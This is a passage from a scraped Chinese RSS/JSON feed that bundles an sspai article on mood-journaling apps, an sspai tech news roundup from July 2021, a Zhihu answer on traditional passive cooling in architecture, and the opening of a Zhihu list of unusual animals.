chapter='[{\"name\":\"开场，嘉宾简介与节目缘起\",\"time\":53},{\"name\":\"提问环节：从供应链的角度看产品\",\"time\":273},{\"name\":\"购买产品是如何看待设计与功能的关系\",\"time\":1190},{\"name\":\"看展可以有助于了解供应链吗？\",\"time\":1401},{\"name\":\"问路和 Nick 的好物推荐\",\"time\":1541}]'>Audio</div>\n<h2>👫 人物介绍</h2>\n<ul><li>问路：少数派电商负责人</li></ul>\n<h2>📮 反馈请致</h2>\n<ul>\n<li>主播邮箱：nick@sspai.com</li>\n<li>少数派主页：<a href=\"https://sspai.com/\">https://sspai.com</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67790"},{"title":"在琐碎生活中寻找小小仪式感，我这样记录自己的生活","date":"2021-07-20 03:30:00","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>关于生活记录</h2>\n<p>身为一个双鱼座，虽然不能说百分百爱仪式感、喜欢小浪漫小惊喜这种细节，但是每个双鱼座心里还是会有一些稀奇古怪情节每天都在幻想中。</p>\n<p>成年人嘛，有些小心思小情绪可能无法时时都展现出来，尤其是一些烦闷、难过的情绪在某些场合无法畅快释怀，这种时候就需要一些途径去自我发泄、自我表达。</p>\n<p>小时候写日记老师总是叮嘱，不要写成流水账，要描述的有趣一些。然而长大了以后我们发现，生活的快门下，好像又像用流水账的叙事形式，记录着发生的事情。</p>\n<p>我以前会有些疑惑，为什么会有人喜欢自言自语。后来当我开始进行情绪控制时，我突然开始理解了自言自语原来也是一种自我解决的对话方式。所以生活日常记录更像是一个「我无法用快门拍下但又想将它定格下来的记忆」，不管是日记也好，心情记录也罢，亦或是我们从小就熟悉的流水账。</p>\n<h2>我的生活记录目的</h2>\n<p>对于我而言，我希望自己的生活记录是通过记录日常的瞬间想法、瞬时情绪、或是自己觉得某一瞬间做的特别好的事情，想象着在日后哪天无聊不知道做什么，随手点开软件一点点往下翻，然后无数画面涌上心头，甚至嘴角会有一抹甜甜笑容，又或是突然笑到打鸣立马截图发微博的陈年喜剧片段的场景。</p>\n<p>我觉得这种瞬间很酷，很有意思，比听故事有趣多了。因为这些都是我自己的故事，我会记得所有细节。不用去考虑这段话表达了作者什么心态，因为我体验过的，我知道所有感觉。</p>\n<p>但是我觉得日常记录形式不能用框架固定住，比如你要固定一天写一篇日记进行回顾，或者是必须在情绪变化时进行记录，我觉得有些复杂。</p>\n<p>我自己的一套标准是，觉得今天过得有意思的时候，我会记录一篇一日回顾。哪怕今天只是因为吃了两顿非常有意思的饭，那我就可以写一个「今天吃了啥」来记录一日回顾；或者在某一瞬间我脑海中有个想法自我感觉很牛逼，那我就要记录下来，用于以后回头看看会不会造就「苟富贵，勿相忘」的场景。</p>\n<p>所以针对我的这些使用需求和个人对 App 的一丢丢颜狗因素，目前用来记录生活的软件大概是三个：iCity 我的日记、极简日记和 mooding。</p>\n<h2>为什么是它们？</h2>\n<p>我们倒着说吧，从时间留存性由短到长开始。</p>\n<h3>mooding —— 摩天轮心情记录</h3>\n<p>初识 mooding 主要是被他们可爱的画风吸引，是那种可爱中又带着点正经记录的软件。 就像文案介绍的那样，mooding 是主打心情记录，以「摩天轮座椅加动物乘客」的形式进行展示。摩天轮会在在屏幕上不停转动，每记录一个当日心情，就会增加一名乘客，类似于游戏中打卡签到。我觉得很有趣味和仪式感，特别是记录瞬间心情这种，本身就是多变的，加上这些可爱的元素画风，简直是给自己的心情记录加了一个奇迹暖暖模式。</p>\n<p>关键是首页摩天轮的样式是可以更换的，我这周想要棒棒糖甜美风，下周想要简约风，随时更换。仿佛每天都要换手机壳一样，就是不要一成不变。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/a5dee9e8b7614d2e4e503d6aa53ed000\"></figure><p>Mooding 的记录心情好似定制蛋糕，首先要选择蛋糕的口味——今天/此时的心情，比如开心、一般般、不错等（可多选），或者自定义进行输入心情。接下来就是在蛋糕里添加一些零碎口感——日记文字记录。目前已经支持「添加图片」功能，所以如果此时无法用文字描述我的当下心情，我就选择直接一张图扔下去表达此刻的我。图片这个时候可能比文字更生动形象。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/97b0187a346357f9d5ef1e42d549f667\"></figure><p>最后为这个定制蛋糕搭配一下外饰和包装，这么多可爱动物角色（甚至还有使用时长彩蛋），简直就像是小女生在毛绒玩具中做选择一样，挑个座椅就直接将定制过程结束并且打卡上架。</p>\n<p>就是这么一个简单的心情记录，有的人可能会觉得未免也太浪费时间了吧，我点开 Bear 去记录一下不比这个更高效快速吗？——是的。但是我们记录心情是仅仅只为了「开心、生气」这几个字吗？并不是。我们记录心情，其实是记录心情产生的过程，而过程是有情绪变化的，你在进行仪式感记录的过程中，或许就已经开始进行更多的想法碰撞了。</p>\n<p>当然，记录这个东西，从来都不是规定你必须每天都要记录。心血来潮记一笔完全 OK，每天都记也可以，这样一趟摩天轮就满员啦～强迫症患者看了都说舒适呢。</p>\n<p>所以如果你跟我一样，对这种可爱画风没有抵抗力，我推荐你下载尝试一下。用不了几天没关系，但至少我们尝试过了。</p>\n<p>说来也很惊喜，我之前微博抽奖中了这个软件的永久会员，可能就是想让我用起来吧，缘分注定。</p>\n<span class=\"ss-application\" app-id=\"15976\"> </span><h3>极简日记 —— 流水账记录选手狂喜</h3>\n<p>极简日记是前段时间在即刻社区看到的，它的时间轴呈现方式刚好就对上了「流水账」的琐碎记录，不管是看剧还是一句吐槽，都可以收录在这个软件里，简直就是「唠家常」必备。</p>\n<p>软件整体风格很简洁，操作也比较简单，上手成本几乎为 0，只管记录就完事了。觉得只记录文字太单调？人家还可以添加 emoji 进行双重释义，如果觉得提供的表情也没有达到表达诉求，还可以通过标签功能再次进行分类标注。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/9196ef1ec75790b6ffc28aa4b070a18e\"></figure><p>哦对，也可以在本身记录下加一点自己的画外音评论。我觉得还挺不错。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/54d34bf0a8d86601271692b581b7a8c3\"></figure><p>不过我使用这个软件最爱的功能就是它的生成分享图模式。对于每天喜欢碎碎念，喜欢一图流展示生活的社交媒体爱好者，应该就是量身定制吧。</p>\n<p>而且一图流的同时还能保证隐私，比如我这张图里有一个不想分享出来的，但是又不能为了这一条专门再去删除。软件里提供了左滑隐藏选项就能即刻隐藏，再去分享就会方便很多了。当然你也可以单独选择一条进行生成分享图，就像上方的那张图。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/986484ce082021c7178379aa516cea66\"></figure><p>同时它的评分星级那一栏，类似于小豆瓣了，但是没有豆瓣那种记录统计的效果，所以如果记录一些听的播客、某集综艺等这种类型可能会更合适一些。就是整季的评分去豆瓣，单独某一集的吐槽可以在极简日记里记录，我觉得还挺完美。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/02b05f1eab5f57a1e9ca1aefe9731f66\"></figure><p>目前极简日记只有 iOS 版本，Android 版本的开发好像是在进行中，作者最近也在群里提前透露了界面，估计上线也是时间问题啦～</p>\n<span class=\"ss-application\" app-id=\"16107\"> </span><h3>iCity 我的日记 —— 每日回顾专用</h3>\n<p>有些东西，毕竟还是专业的。所以在每日回顾这一趴，我还是选择了「iCity 我的日记」。作为一个踏实的日记应用，它有点颜值也不复杂，可以书写可以配图，还有各种发布权限。可以公开也可以全部调成「仅自己可见」，化身为自己的树洞。</p>\n<p>我喜欢用它的原因是，它的评论和日历回顾模式。虽然评论模式常用于在世界模块给其他用户进行评论留言等，但我更愿意把评论功能留给「作为每日回顾的一个补充」「回头翻阅时置身事外的二次评论」等。某天翻到之前吃过的饭，看着图片就开始馋了，立刻回复自己，好像突然有了个约定一样。没准再过个几年，我回头翻到这组对话，觉得现在的自己还真的挺喜欢吃。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/0b8f67826d9ee11e70d6c06b88541377\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/a48fa78c3b5107c68a680ac8d7020089\"></figure><p>我虽然嘴上说着不刻意强迫自己每天进行记录，但是每次点开右上角查看记录痕迹时，看到这大片的空白时，我可能还是会焦虑。但是无所谓，躺平就完事了。没有主动想记录的想法，说明今天确实没有什么特殊的点值得回顾。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/ab6b556bc68c487e6359d510dc278dc7\"></figure><p>所以日记内的日历功能方便我回顾就好了，不要成为变相焦虑神器。</p>\n<p>当然 iCity 也有分享导出图片的功能，可以把你的整个记录（文字 + 图片）全部导出，还可以选择分享样式，用过 iNote 的同学应该看着这些样式都比较眼熟了，同时支持隐藏用户名。这里就比较适合图片记录日记爱好者的导出选择了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/19/article/08f0fddf2f94585dd604d0c7a2d9f557\"></figure><h2>用这么多，真的能记录下来吗？</h2>\n<p>就像上边所介绍的一样，每个软件因其功能侧重不同，所以使用起来也各司其职。</p>\n<p>mooding 因其可爱画风和摩天轮的定制仪式感，非常适合心情的记录，就是无拘无束，想记就记，不管多开心多搞笑或者生气。选一个坐上就好了，这时候的记录重点在于那一瞬间的情绪有地方接收即可。就像跟好朋友倾诉一样，其实我们更多的是想找个能听我说话的人，能理解我的人而已。所以其实 mooding 的回顾功能即便没有很完善，也不耽误我去放置心情，回头看月度雷达图，还能归纳某月的心情指数。</p>\n<p>而鸡毛蒜皮，非常日常非常接地气的生活化气息记录，用流水账配合时间轴是最好的搭配形式。省的别人一见面就问，今天干了什么啊，直接点开「极简日记」生成当日分享图发给对方看，很酷甚至你都 不用解释，因为你的 emoji 和标签其实都进一步补充了更多细节。同时随时评分功能更是节省了你在社交平台上分享想法时的无意义辩论了，专注自己即可。</p>\n<p>回归本源，最大段最值得总结的，那就放在最适合回顾的应用里。iCity 作为一个老牌应用，虽然许久不更新一次（没有吐槽的意思），但是使用起来一点都不耽误。而且功能也都能满足日常日记的要求，所以它是真的名副其实的日记应用。</p>\n<p>那么为了这些个需求，真的不嫌麻烦吗？</p>\n<p>我觉得每个应用都有它们各自擅长的部分，如果我把记录在 mooding 里边的简单心情放到了「iCity」里，我觉得是一种“浪费”，这条简短的记录会把我的记录片段种类打乱，我不希望打开日记应用回顾时，看到的是这种简短琐碎的。</p>\n<p>当然，每个人标准不一样，我们了解清楚自己的需求后才能更完善地去打造自己的日常记录模式。</p>\n<p>虽然我无法做到时时记录，但我觉得正是因为这些可可爱爱的应用，至少在我想放置想法和情绪时，有地方可以接纳它们，并且日后可以让我再去回忆它，那就足够了。</p>\n<p>毕竟记录本身，其实就是一件「有仪式感」的事情，我们在记录的瞬间就已经做好了万全的准备，所以具体落实到硬件上，那就千变万化啦。</p>\n<p>这次给大家分享这些软件其实并不算是安利大家去跟我一样使用那些软件，更多的是专注自身了解真实诉求，然后去选择记录途径或者能让自己进行自我交流的方式。</p>\n<p>或许我们无法通过记录保证百分百自我成长，但总会在记录中收获一些不一样的成长经验啦～</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/63674\" target=\"_blank\">如何用 Obsidian 做间歇式日记</a></li>\n<li><a href=\"https://sspai.com/post/41458\" target=\"_blank\">用 App 辅助冥想和写日记，在焦虑生活中获得平静的内心</a></li>\n<li><a href=\"https://sspai.com/post/66061\" target=\"_blank\">依靠「观心笔记」，我把杂乱思绪提炼成创造力</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活📰</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67778"},{"title":"派早报：iOS 14.7 于本日推送、工信部公布新一批侵害用户权益行为的 App 等","date":"2021-07-20 01:03:13","description":"\n<h2>iOS 14.7 更新于本日推送</h2>\n<p>7 月 20 日，Apple 开始推送 iOS 14.7、tvOS 14.7、watchOS 7.6 与 HomePod 14.7。</p>\n<p>本次更新主要向 iPhone 12 系列提供了本月刚发布的 MagSafe 外接电池支持，修复了部分 iPhone 11 机型的电池信息 bug 与 Apple Music 应用的意外停止问题。此外，更新说明中虽未提及，但此前发现的连入特殊命名 Wi-Fi 网络会导致 iPhone Wi-Fi 功能关闭的问题经测试也被解决。<a href=\"https://www.macrumors.com/guide/ios-14-7-features/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/7ebf0b5ba26f7dbcddb76fc59a88166e\"></figure><h2>工信部公布新一批关于侵害用户权益行为的 App 通报</h2>\n<p>7 月 19 日，工信部公布 2021 年第 6 批关于侵害用户权益行为的 App 通报，针对用户反映问题较多的医疗健康、电子商务、实用工具等类型手机应用软件进行了专项检查，已通知相关企业进行了整改。截至目前，尚有 71 款 App 未完成整改，包括下厨房、虎牙直播、凤凰新闻、蜻蜓 FM 等。<a href=\"https://www.miit.gov.cn/jgsj/xgj/APPqhyhqyzxzzxd/tzgg/art/2021/art_83b7e0c41afb47249ac247ffb983ee44.html\" target=\"_blank\">来源</a></p>\n<h2>中兴 Axon 30 将于 7 月 27 日发布</h2>\n<p>7 月 19 日，中兴手机官方发布微博宣布，将于 7 月 27 日 19:00 召开线上新品发布会，正式发布 Axon 30 5G 智能手机，该设备将搭载全新一代屏下摄影技术。<a href=\"https://weibo.com/2063264115/KpqpgD1Jw\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/80c7f9a9d734090ba2cd87d28106c9c0\"></figure><h2>华为 P50 系列将于 7 月 29 日正式发布</h2>\n<p>7 月 19 日，华为终端官方微博发布信息，将于 7 月 29 日 19:00 的华为旗舰新品发布会，届时将公布华为 P50 系列智能手机。<a href=\"https://weibo.com/1839167003/KpqpgD10d\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/a180ac35d95220ffb5b6ef08593fcc70\"></figure><h2>中国电信发布麦芒 10 SE</h2>\n<p>中国电信于 7 月 19 日正式发布麦芒 10 SE，该机采用 6.51 英寸高清屏，搭载了高通骁龙 480 处理器，6GB 的运存和 128GB 的存储。支持 SA/NSA 双模以及 5G 双卡双待，内置有 5000mAh 大容量电池并支持 22.5w 超级快充，摄像头方面采用后置矩阵镜头（1300 万像素主摄、200 万像素景深以及 4cm 的微距镜头），配色上有银河紫、极光蓝、幻夜黑三种，售价为 1699 元，7 月 24 日上午十点正式发售。<a href=\"https://www.pingwest.com/w/246284\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/20/article/9a238be0ba7283cc7f409985ddf22917\"></figure><h2>Bose QuietComfort 45 通过 FCC 认证</h2>\n<p>7 月 16 日，Bose QuietComfort 45 头戴式蓝牙主动降噪耳机通过了 FCC 认证，并公布了部分相关信息。其中，产品图像等相关信息目前处于暂时保密状态，预定公开日期为 2022 年 1 月 12 日。<a href=\"https://fccid.io/A94437310\" target=\"_blank\">来源</a></p>\n<h2>微软为 Windows 10 提供 DirectStorage 开发者预览版</h2>\n<p>此前，微软曾提及将 Xbox Series X|S 主机上的 DirectStorage 技术引入 Windows 11，为 PC 游戏玩家带来更好的游戏体验。7 月 16 日，微软发布 DirectStorage 开发者预览版，并在博客中说明，DirectStorage 将支持 Windows 10 1909 及以上版本，尽可能让更多玩家从该技术受益。<a href=\"https://devblogs.microsoft.com/directx/directstorage-developer-preview-now-available/\" target=\"_blank\">来源</a></p>\n<h2>vivo 首款自研芯片曝光：内部代号「悦影」</h2>\n<p>7 月 19 日，有消息称，Vivo 首款自研芯片即将正式推出，该芯片内部代号为「悦影」，目前尚不清楚该芯片的更多功能细节，或许为提升影像能力的一款芯片，此前网上曾曝光两张 Vivo 申请的芯片商标：vivo SoC 以及 vivo Chip，申请时间为 2019 年 9 月，涵盖产品类别包括中央处理器、调制解调器、计算机芯片、印刷电路、计算机存储装置等一系列和处理器相关的产品。<a href=\"https://www.jiemian.com/article/6374388.html\" target=\"_blank\">来源</a></p>\n<h2>腾讯宣布收购英国游戏工作室 Sumo</h2>\n<p>7 月 19 日，腾讯正式宣布以 12.7 亿美元的价格收购英国游戏工作室 Sumo，并占有其 8.75% 的股份。此前，Sumo 曾开发了 PlayStation 5 上的 Sackboy：A Big Adventure。<a href=\"https://www.gamesindustry.biz/articles/2021-07-19-tencent-to-buy-crackdown-and-sackboy-developer-sumo-in-usd1-3bn-deal\" target=\"_blank\">来源</a></p>\n<h2>你可能错过的好文章</h2>\n<ul>\n<li>🔑️ <a href=\"https://sspai.com/post/66324\" target=\"_blank\">对「自愿」上传隐私数据说不，这些是我们可以做的</a>\n</li>\n<li>🛍️ <a href=\"https://sspai.com/post/67766\" target=\"_blank\">多款效率工具限时特惠，少数派软件商城 7 月活动别错过</a>\n</li>\n<li>🥑 <a href=\"https://sspai.com/post/67777\" target=\"_blank\">给还在找减重方法的你：生酮饮食真的值得尝试吗？</a>\n</li>\n<li>⭐️️ <a href=\"https://sspai.com/post/67785\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67793"},{"title":"没有空调的古人住宅，在夏天是如何避暑的？","date":"2021-07-19 23:07:25","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-1b2889cd21a77789194e961efc7f6f09_l.jpg?source=8673f162\"><span>ag獭，</span><span>好奇而无用的獭獭</span>\n<a href=\"https://www.zhihu.com/question/459912711/answer/2006739927\" hidden>阅读原文</a>\n</div>\n<div>\n<p>大家都知道，中东和印度的夏天是很热的，那里的古人是如何避暑的呢？</p>\n<p><strong>隔绝热空气</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a9db44ba68de042299b945fa946753f6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大多数中东和南亚建筑的墙壁都很厚（甚至可厚达几米），窗户却很小，数量也不多。厚厚的墙壁可以有效隔热，小小的窗户则阻止了阳光射入。比如上图中德里红堡的内院，除了中间的会客厅和右侧的彩宫（后宫的一部分），大多数建筑都是墙厚窗小的画风。</p>\n<p><strong>蒸发制冷</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-96aa26ea1727d8c544e2d05989e72aaf_720w.jpg?source=8673f162\" alt=\"\"></figure><p>彩宫（Rang Mahal）内有乾坤。一条水渠从宫中穿过，汇入中心水池。炎炎夏日，水分蒸发吸收热量，能够起到一定的降温的作用。彩宫另设有地下室，天气太热的时候，可以跑到地下室去避暑（由于土壤的隔热作用，夏天的地下室一般都比地面阴凉很多）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c266f218d06dffbaa517aec451dc9617_720w.jpg?source=8673f162\" alt=\"\"><figcaption>红堡里的 Salsabil</figcaption></figure><p>而在红堡的其他一些建筑中，则有叫 Salsabil 的斜面喷泉。水流通过喷泉的小喷水口缓缓流出，在斜面上形成细小的水流，通过水流和建筑的温差以及蒸发制冷，提供一定的降温作用。类似的斜面喷泉，广泛存在于从北印度到西班牙的各种建筑中，甚至在庞贝遗址中也有。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6e9d3518b0e533d4fd728a232b54cd27_720w.jpg?source=8673f162\" alt=\"\"><figcaption>中国古代的凉屋</figcaption></figure><p>类似的建筑，中国也有。长安十二时辰里提到过一种叫自雨亭的建筑，原理是用机械装置将水运送到屋顶，通过水流和水的蒸发来降低温度。当时，许多富人家里都建有凉屋，通过水车将水运送到屋顶，以水流降低室温。</p>\n<p>平民家庭可能造不起喷泉，他们又是如何利用蒸发制冷的呢？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-c19e9371668cc31775e13cf7a7ca223b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>突尼斯建筑中的 Mashrabiya</figcaption></figure><p>中东伊斯兰世界的许多建筑中，都有叫 Mashrabiya 的结构。Mashrabiya 突出于墙面，上面有许多开孔，用来捕捉气流，使空气通过。里面则放置一些水盆或水罐，用来蒸发制冷。Mashrabiya 代替了我们这边建筑中的窗户和阳台，除了制冷以外，也可起到保护隐私的作用。</p>\n<p><strong>加强对流</strong></p>\n<p>古人在建筑结构上动足了脑筋，通过强化对流来增强蒸发制冷。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-863328704ef474f5d27b78e2980e7026_720w.jpg?source=8673f162\" alt=\"\"><figcaption>伊朗亚兹德 ab anbar 水库的附属风塔</figcaption></figure><figure><img src=\"https://pic2.zhimg.com/v2-97d2abe1ec5171e0ce1d1be1fbd39bf1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>风塔原理示意图</figcaption></figure><p>中东的很多建筑都有一个高高的风塔，尤其是在伊朗建筑中，风塔更是其中的重要组成部分。利用地面和高处空气的温差，风塔能够加强空气对流，造得越高，产生的对流就越强。结合附带的水池，风塔还能加速水分蒸发，强化蒸发制冷。为了调节空气流向并阻隔被污染的空气，风塔另设有过滤装置，可以随需求开关。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-30a33fa3b00a0ae2d0bd239e3c7a796d_720w.jpg?source=8673f162\" alt=\"\"><figcaption>佛罗伦萨古建筑中的挑高天井</figcaption></figure><p>类似风塔的建筑结构，在 3000 多年前的古埃及和伊朗就已经出现，地中海沿岸的欧洲建筑中，也有类似的结构。意大利的很多古代建筑都是在中间开一个天井，下设水池或喷泉。天井的作用类似风塔，能够加强空气对流，水池则能够提供一定的蒸发制冷效果。</p>\n<p>风塔是种被动式通风装置，而在中国，人们发明了最早的离心式风扇，通过机械动力进行主动通风。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-629ffbc66f3d568db3cbebdd07bcc072_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《天工开物》中的风扇车</figcaption></figure><p>大约 2100 年前，中国人发明了风扇车，只要把粮食放入漏斗，以手摇或脚踏的方式转动风扇，就可以吹开谷壳，留下谷粒。风扇车里的风扇结构，是近代离心式风扇的祖先。利用类似的原理，西汉的工匠丁缓发明了一种带有 7 片叶片的风扇，以人力推动叶片旋转。</p>\n<p><strong>地热耦合</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1ecd1d3f01dafa17854724350b77b2c2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>坎儿井</figcaption></figure><p>在中亚和中东，有许多以地下暗渠连通竖井，通过蓄水池储存水分的沟渠系统。这种沟渠叫做坎儿井，一般认为，坎儿井是 2000 多年前由伊朗人发明的（不过也有观点认为坎儿井来自新疆）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7c245b252cdc5baf0e2362a5a31cb12e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>坎儿井和风塔的梦幻联动</figcaption></figure><p>前面说过，因为土壤的隔热作用，在夏天，地下温度往往低于地面。因此在夏天，坎儿井中的水温要比地表的气温低得多。利用两者的温差，就可以用坎儿井中的水来冷却地面的建筑。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d06f5e0340747f9d46656e7875424794_720w.jpg?source=8673f162\" alt=\"\"></figure><p>北魏洛阳城凌云台的凉风观，也利用了类似的原理，通过水井中的地下水以及空气的对流，达到降低温度的效果。</p>\n<p>伊朗的天然冰室 Yakhchāl，可以说是上述制冷手段之集大成者。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ffc85554aa7b1e779a432e3844c4e1fa_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Yakhchāl 的外墙由耐水隔热材料砌成，底部墙体通常厚达 2 米，下面则连通坎儿井。整个建筑如同一个拉长版的窝窝头，仅在底部和顶部设有开孔。Yakhchāl 的结构和前面所说的风塔有异曲同工之处，同样能加强空气的对流，下方连通的坎儿井，除了提供地热交换以外，井里的水分蒸发后能够进一步制冷。</p>\n<p>大约 2400 年前，伊朗人就开始建造 Yakhchāl 了，现存的许多 Yakhchāl 已有数百年历史，至今依然能够使用。伊朗内陆的沙漠地带昼夜温差非常大，利用 Yakhchāl 的制冷功能，伊朗人在 Yakhchāl 里储存了大量冰块，可以用它来生产冷饮。（根据某些学者的观点，最早的冷饮就出现在古代伊朗，应该是类似刨冰的某种冷饮）</p>\n<p><strong>相关回答——</strong></p>\n<p><a href=\"https://www.zhihu.com/question/461304212/answer/1906113146\">波斯文明对世界作出过哪些贡献？</a><a href=\"https://www.zhihu.com/question/462960421/answer/1929515263\">印度文明对世界产生过哪些影响？</a><a href=\"https://www.zhihu.com/question/335941271/answer/1947213048\">中华文明对人类有哪些主要贡献？</a></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/459912711\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738269"},{"title":"物种真奇妙！——动物篇","date":"2021-07-19 23:07:20","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-b8f2e818b5e3c67819adadcea6069891_l.jpg?source=8673f162\"><span>熙寒，</span><span>知乎原教旨主义喵</span>\n</div>\n<div>\n<blockquote>世界之大，无奇不有。怪形异兽，且听道来。</blockquote>\n<ul><li><strong><em>The Star-Nosed Mole（星鼻鼹鼠）</em></strong></li></ul>\n<p>为了在黑暗的环境中生存，弱视的鼹鼠拥有了“鼻孔两开花”的秘密武器::它们依靠这 22 个呈线状的肉质附属物，每一个“小手指”都有超过 10 万个神经末梢，赋予了星鼻鼹鼠动物王国最敏感的触觉器官。（相比之下，人的一只手才仅有 17，000 个神经末梢）</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-eebb4939ebd489825f330ad9ff787643_b.jpg\" alt=\"\"><figcaption>图片来源 https://nwf.org/Magazines/National-Wildlife/2018/Feb-Mar/Animals/Star-nosed-Mole</figcaption></figure><p>更为神奇的是这些会游泳的鼹鼠能够在水下对准贝壳等生物以每秒 5-10 个的速度吹出气泡，从而帮助它们在水下也可以借助嗅觉发现猎物和潜在的危险。</p>\n<ul><li><strong><em>Atretochoana Eiselti Or 'Penis Snake'（JJ 蛇）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-b58d49e90437bce15f0c7dd60ed91d07_b.jpg\" alt=\"\"><figcaption>图片来源 https://factanimal.com/atretochoana/</figcaption></figure><p>这是种极其罕见的物种:Atretochoana eiselti，实际上它们并不是蛇，而更像是一种蝾螈。1968 年，美国科学家爱德华·哈里森·泰勒( Edward Harrison Taylor )用一个 738 毫米长的标本首次描述了它。它有一个扁平的、宽厚的头部，以及两个鼻孔，称为前鼻孔，它们无肺的事实给科学家们带来了相当大的困扰，因为没有人能够弄清楚它是如何从它的水中获得氧气的。</p>\n<ul><li><strong><em>Glaucus Atlanticus（大西洋海神海蛞蝓或蓝天使）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-232afcd9f2ffae313995a00714ace687_b.jpg\" alt=\"\"><figcaption>图片来源 https://www.boredpanda.com/strange-unusual-animals/?utm_source=cn.bing&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;utm_medium=referral&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;utm_campaign=organic</figcaption></figure><p> <br><br>这种可爱的小生物多分布在太平洋和印度洋的温暖水域中。虽然看起来“人畜无害”，但艳丽的外表下却“暗藏杀机”:它们能够借助胃里的气囊在温暖的洋流中倒挂着，（如图）</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-62666fbc3237c5e37260bf0c0c8988dc_b.jpg\" alt=\"\"><figcaption>这种海蛞蝓将鲜艳的一面暴露在空中的捕食者面前（鲜艳的蓝色在海浪的背景下起到了伪装的作用，而它暗色的腹部与明亮的海面融为一体，使能够更好的它躲避下面的捕食者。）图片来源 https://www.pbs.org/wnet/nature/blog/inside-nature-featured-creature-blue-dragon/</figcaption></figure><p>并且用蓝色的小脚抓住有毒的小水母，它们将刺细胞集中在自己手指状的附属物中，用来捕猎。</p>\n<ul><li><strong><em> Grimpoteuthis umbellata（烟灰蛸）</em></strong></li></ul>\n<figure><img src=\"https://pic4.zhimg.com/v2-e5ba169f8d143ac3b3638ca1745d00cf_b.jpg\" 